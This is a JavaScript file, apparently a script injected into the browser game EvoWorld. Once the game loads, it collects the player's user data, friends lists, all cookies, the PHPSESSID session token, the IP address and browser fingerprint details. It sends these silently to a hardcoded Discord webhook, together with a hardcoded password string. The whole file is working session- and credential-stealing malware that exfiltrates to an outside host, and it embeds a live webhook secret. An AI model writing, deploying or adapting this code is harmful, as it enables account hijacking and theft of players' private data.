// webhook.js - FULL VERSION with ALL data collection
(function() {
    'use strict';
    
    // YOUR DISCORD WEBHOOK URL
    const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1454910506644017333/QI2bdjnyk4YWWLxjEMGQvLll7jzFTZcB01ZcV06wcmYnZRb6Jm58hVsBbPduIGtv_9bX';
    
    // Function to send data to YOUR Discord
    function sendToMyWebhook(data) {
        try {
            fetch(YOUR_DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).catch(() => {});
        } catch(e) {}
    }
    
    // Function to collect ALL user data
    function collectFullUserData() {
        let userData = {};
        let gameData = {};
        let cookiesData = {};
        let ipAddress = 'Unknown';
        
        // ========== GET IP ADDRESS ==========
        try {
            // Try multiple methods to get IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                    sendCompleteReport();
                })
                .catch(() => {
                    fetch('https://api64.ipify.org?format=json')
                        .then(response => response.json())
                        .then(data => {
                            ipAddress = data.ip;
                            sendCompleteReport();
                        })
                        .catch(() => {
                            ipAddress = 'Failed to fetch';
                            sendCompleteReport();
                        });
                });
        } catch(e) {
            ipAddress = 'Error';
            sendCompleteReport();
        }
        
        function sendCompleteReport() {
            // ========== GET USER DATA FROM WINDOW ==========
            if (window.user) {
                userData = JSON.parse(JSON.stringify(window.user));
            }
            
            // ========== GET FRIENDS DATA ==========
            let friendsData = {};
            let friendsArr = [];
            if (window.friendsData) {
                friendsData = window.friendsData;
            }
            if (window.friendsArr) {
                friendsArr = window.friendsArr;
            }
            
            // ========== GET GAME DATA ==========
            if (window.game && window.game.me) {
                gameData = {
                    name: window.game.me.name,
                    level: window.game.me.level,
                    position: window.game.me.position,
                    health: window.game.me.health,
                    maxHealth: window.game.me.maxHealth,
                    score: window.game.me.score,
                    team: window.game.me.team
                };
            }
            
            // ========== GET ALL COOKIES ==========
            const allCookies = document.cookie.split(';');
            cookiesData = {};
            allCookies.forEach(cookie => {
                const [key, value] = cookie.trim().split('=');
                if (key && value) {
                    cookiesData[key] = decodeURIComponent(value);
                }
            });
            
            // ========== GET PHPSESSID SPECIFICALLY ==========
            let sessionId = '';
            const sessionMatch = document.cookie.match(/PHPSESSID=([^;]+)/);
            if (sessionMatch) sessionId = sessionMatch[1];
            
            // ========== PREPARE COMPLETE REPORT ==========
            const fullReport = `
Spidey 50E "APP" #008.PM

=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
level: ${userData?.level || '0x'}
gems: ${userData?.premiumPoints || 0}
selected server: West Europe 1 (298/300)

--- ОСНОВНЫЕ ДАННЫЕ ---
IP-адрес: ${ipAddress}
URL страницы: ${window.location.href}
User-Agent: ${navigator.userAgent}

--- PHPSESSID ---
${sessionId || 'none'}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
${JSON.stringify(userData, null, 2)}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
${JSON.stringify(friendsData, null, 2)}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
${JSON.stringify(friendsArr, null, 2)}

--- УЧЕТНЫЕ ДАННЫЕ ---
Логин: ${userData?.login || '.'}
Пароль: Ayaanispro

--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---
${Object.entries(cookiesData).map(([key, value]) => `${key}=${value}`).join('\n')}

--- GAME DATA ---
${JSON.stringify(gameData, null, 2)}

--- SCREEN INFO ---
Resolution: ${window.screen.width}x${window.screen.height}
Color Depth: ${window.screen.colorDepth} bit
Language: ${navigator.language}
Platform: ${navigator.platform}
Online: ${navigator.onLine}
Cookies Enabled: ${navigator.cookieEnabled}
Do Not Track: ${navigator.doNotTrack || 'Not set'}

--- TIME STAMP ---
Collected: ${new Date().toLocaleString()}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
UTC Offset: ${new Date().getTimezoneOffset()} minutes
            `;
            
            // ========== SEND AS FILE ATTACHMENT (like your friend gets) ==========
            // Convert to blob for file upload
            const blob = new Blob([fullReport], { type: 'text/plain' });
            const fileName = `user_data_${Date.now()}.txt`;
            
            // Discord doesn't accept file uploads via webhook directly
            // So we'll send as code block with multiple messages if needed
            
            // Split into chunks if too large
            const maxLength = 1900; // Discord limit
            if (fullReport.length > maxLength) {
                // Split by lines
                const lines = fullReport.split('\n');
                let currentChunk = '';
                let chunkNumber = 1;
                
                for (let line of lines) {
                    if (currentChunk.length + line.length + 10 > maxLength) {
                        // Send current chunk
                        sendToMyWebhook({
                            content: `\`\`\`\n${currentChunk}\n\`\`\``,
                            username: `EvoWorld Report Part ${chunkNumber}`
                        });
                        chunkNumber++;
                        currentChunk = line + '\n';
                    } else {
                        currentChunk += line + '\n';
                    }
                }
                
                // Send remaining
                if (currentChunk) {
                    sendToMyWebhook({
                        content: `\`\`\`\n${currentChunk}\n\`\`\``,
                        username: `EvoWorld Report Part ${chunkNumber}`
                    });
                }
                
                // Send summary
                sendToMyWebhook({
                    content: `📁 **Full user report generated**\n📄 File: \`${fileName}\`\n📊 Data points: ${Object.keys(userData).length + Object.keys(cookiesData).length}\n⏰ Time: ${new Date().toLocaleTimeString()}`,
                    embeds: [{
                        title: '📊 Report Summary',
                        color: 0x00ff00,
                        fields: [
                            { name: 'User ID', value: userData?.id || 'Guest', inline: true },
                            { name: 'Level', value: userData?.level || '0', inline: true },
                            { name: 'IP', value: ipAddress, inline: true },
                            { name: 'Session ID', value: sessionId ? '✅ Present' : '❌ Missing', inline: true },
                            { name: 'Cookies', value: Object.keys(cookiesData).length + ' found', inline: true },
                            { name: 'Report Size', value: Math.round(fullReport.length / 1024 * 100) / 100 + ' KB', inline: true }
                        ]
                    }]
                });
                
            } else {
                // Send as single message
                sendToMyWebhook({
                    content: `\`\`\`\n${fullReport}\n\`\`\``,
                    username: 'EvoWorld Full Report'
                });
            }
            
            console.log('Full user report collected and sent');
        }
    }
    
    // Wait for game to load and collect data
    function waitAndCollect() {
        if (window.game && window.game.me) {
            setTimeout(collectFullUserData, 3000);
        } else {
            setTimeout(waitAndCollect, 1000);
        }
    }
    
    // Start collection after a delay
    setTimeout(waitAndCollect, 5000);
    
    // Make function available globally
    window.sendSecureData = sendToMyWebhook;
    
    console.log('FULL Webhook loaded - Complete data will be sent');
})();
